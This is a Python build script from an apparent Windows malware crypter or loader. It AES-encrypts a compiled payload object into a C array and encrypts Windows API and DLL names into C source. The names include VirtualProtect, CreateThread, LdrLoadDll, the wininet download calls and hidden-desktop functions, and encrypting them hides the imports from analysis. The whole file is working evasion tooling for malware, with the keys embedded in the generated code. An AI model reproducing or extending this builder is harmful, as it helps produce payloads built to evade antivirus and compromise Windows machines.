from Crypto.Cipher import AES
from typing import List
from cryptstring import ce, se, be
import secrets


def enc_obj(MasterKeyPayload, path: str):
    with open(path, "rb") as f:
        data = f.read()
    data = data[0x104:]
    while len(data)%16 != 0:
        data += b'\x00'
    cipher = AES.new(MasterKeyPayload, AES.MODE_ECB)
    plaintext = cipher.encrypt(data)
    with open("payload_enc.c", "w") as f:
        f.write("unsigned char payload_enc_bytes[] ="+str([hex(byte) for byte in bytearray(plaintext)])
                .replace("'", "").replace("[", "{").replace("]", "}")+";")
    return

def enc_strings(chars, shorts, chars_data, shorts_data, MasterKeyStrings, MasterKeyPayload: str) -> None:
    cipher = AES.new(MasterKeyStrings, AES.MODE_ECB)
    with open("dynamic_strings.c", "w") as f:
        for c, cd in zip(chars, chars_data):
            _ = ce(cd, cipher)
            f.write(f"unsigned char {c}[{len(_)}] = {{{str(_)[1:-1]}}};\n\n")
        for s, sd in zip(shorts, shorts_data):
            _ = se(sd, cipher)
            f.write(f"unsigned char {s}[{len(_)}] = {{{str(_)[1:-1]}}};\n\n")
        f.write(f"unsigned char MasterKeyStrings[16] = {{{str(list(map(int, MasterKeyStrings)))[1:-1]}}};\n\n")
        MasterKeyPayload = be(MasterKeyPayload, cipher)
        f.write(f"unsigned char MasterKeyPayload[16] = {{{str(list(map(int, MasterKeyPayload)))[1:-1]}}};\n\n")


if __name__ == "__main__":
    MasterKeyPayload = secrets.token_bytes(16)
    MasterKeyStrings = secrets.token_bytes(16)
    enc_obj(MasterKeyPayload, "./payload.o")
    chars = [  "cMessageBoxW",  "cVirtualProtect",  "cCreateFileW",
               "cWriteFile",  "cCloseHandle",  "cGetSystemTime",
               "cInternetOpenW",  "cInternetOpenUrlA",  "cInternetReadFile",
               "cInternetCloseHandle",  "cGetLastError",  "cCreateDisktopW",
               "cSetThreadDesktop",  "cCreateThread",  "cCloseDesktop",
               "cExitProcess",  "cRtlExitUserProcess",  "cLdrLoadDll",
               "cRtlInitUnicodeString"]
    chars_data = [
  "MessageBoxW",
  "VirtualProtect",
  "CreateFileW",
  "WriteFile",
  "CloseHandle",
  "GetSystemTime",
  "InternetOpenW",
  "InternetOpenUrlA",
  "InternetReadFile",
  "InternetCloseHandle",
  "GetLastError",
  "CreateDesktopW",
  "SetThreadDesktop",
  "CreateThread",
  "CloseDesktop",
  "ExitProcess",
  "RtlExitUserProcess",
  "LdrLoadDll",
  "RtlInitUnicodeString"
]
    shorts = [  "sKernelbase",  "sWininet",  "sUser32",  "sNtdll",  "sntdll_full_path"]
    shorts_data = [
  "kernelbase.dll",
  "wininet.dll",
  "user32.dll",
  "ntdll.dll",
  "C:\\Windows\\SYSTEM32\\ntdll.dll"
]
    enc_strings(chars, shorts,chars_data, shorts_data,MasterKeyStrings, MasterKeyPayload)
